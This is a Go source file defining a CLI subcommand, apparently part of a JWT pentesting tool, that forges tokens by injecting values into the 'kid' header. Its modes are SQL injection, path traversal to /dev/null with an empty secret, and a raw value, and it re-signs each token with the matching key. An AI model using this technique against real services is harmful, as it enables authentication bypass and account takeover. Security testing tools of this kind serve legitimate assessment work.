package cmd

import (
	"fmt"
	"os"

	"github.com/cerberauth/jwtop/jwt/exploit"
	"github.com/cerberauth/x/telemetryx"
	"github.com/spf13/cobra"
	"go.opentelemetry.io/otel/attribute"
	"go.opentelemetry.io/otel/metric"
)

var (
	exploitKidValue  string
	exploitKidSecret string
	exploitKidMode   string
)

var exploitKidInjectionCmd = &cobra.Command{
	Use:   "kidinjection <token>",
	Short: "Inject a value into the kid header",
	Long: `Produce a copy of the token with a manipulated kid header field.

Modes (--mode):
  sql   SQL injection payload — makes a SELECT return an attacker value.
        Default payload: "` + exploit.DefaultKidSQLPayload + `"
        Default secret:  "secret"

  path  Path traversal to /dev/null — the server reads an empty key file.
        Default payload: "` + exploit.DefaultKidPathTraversalPayload + `"
        Default secret:  "" (empty)

  raw   Arbitrary value supplied via --kid.

Use --kid to override the default payload and --secret to override the key.`,
	Args: cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		telemetryMeter := telemetryx.GetMeterProvider().Meter(exploitOtelName)
		successCounter, _ := telemetryMeter.Int64Counter("exploit.kidinjection.success.counter")
		errorCounter, _ := telemetryMeter.Int64Counter("exploit.kidinjection.error.counter")
		ctx := cmd.Context()

		var kidValue, secretValue string

		switch exploitKidMode {
		case "sql":
			kidValue = exploit.DefaultKidSQLPayload
			secretValue = "secret"
		case "path":
			kidValue = exploit.DefaultKidPathTraversalPayload
			secretValue = ""
		case "raw":
			if exploitKidValue == "" {
				errorCounter.Add(ctx, 1, metric.WithAttributes(attribute.String("error_reason", "missing kid")))
				return fmt.Errorf("--kid is required in raw mode")
			}
			kidValue = exploitKidValue
			secretValue = exploitKidSecret
		default:
			fmt.Fprintf(os.Stderr, "unknown mode %q; valid modes: sql, path, raw\n", exploitKidMode)
			os.Exit(1)
		}

		// Allow --kid and --secret to override the mode defaults.
		if exploitKidValue != "" {
			kidValue = exploitKidValue
		}
		if cmd.Flags().Changed("secret") {
			secretValue = exploitKidSecret
		}

		token, err := exploit.KidInjection(args[0], kidValue, nil, []byte(secretValue))
		if err != nil {
			errorCounter.Add(ctx, 1, metric.WithAttributes(attribute.String("error_reason", "kidinjection failed")))
			return fmt.Errorf("kidinjection: %w", err)
		}
		successCounter.Add(ctx, 1)
		fmt.Println(token)
		return nil
	},
}

func init() {
	exploitKidInjectionCmd.Flags().StringVar(&exploitKidMode, "mode", "sql", "Injection mode: sql, path, or raw")
	exploitKidInjectionCmd.Flags().StringVar(&exploitKidValue, "kid", "", "kid header value (overrides mode default)")
	exploitKidInjectionCmd.Flags().StringVar(&exploitKidSecret, "secret", "", "HMAC secret to sign with (overrides mode default)")
	exploitCmd.AddCommand(exploitKidInjectionCmd)
}
